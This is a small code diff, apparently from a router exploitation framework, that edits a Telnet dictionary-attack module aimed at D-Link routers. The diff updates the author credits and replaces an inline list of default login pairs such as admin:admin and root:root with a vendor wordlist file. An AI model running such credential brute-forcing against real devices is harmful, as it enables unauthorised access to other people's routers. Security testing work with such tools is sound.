@@ -8,7 +8,8 @@ class Exploit(TelnetDefault):
         "description": "Module performs dictionary attack against D-Link Router Telnet service. "
                        "If valid credentials are found, they are displayed to the user.",
         "authors": (
-            "Marcin Bury <marcin[at]threat9.com>",  # routerxpl module
+            "Marcin Bury",
+            "André Henrique (@mrhenrike)",
         ),
         "devices": (
             "D-Link Router",
@@ -19,4 +20,4 @@ class Exploit(TelnetDefault):
     port = OptPort(23, "Target Telnet port")
 
     threads = OptInteger(1, "Number of threads")
-    defaults = OptWordlist("admin:admin,1234:1234,root:12345,root:root", "User:Pass or file with default credentials (file://)")
+    defaults = OptWordlist("file://wordlists/vendors/dlink_defaults.txt", "User:Pass or file with default credentials (file://)")
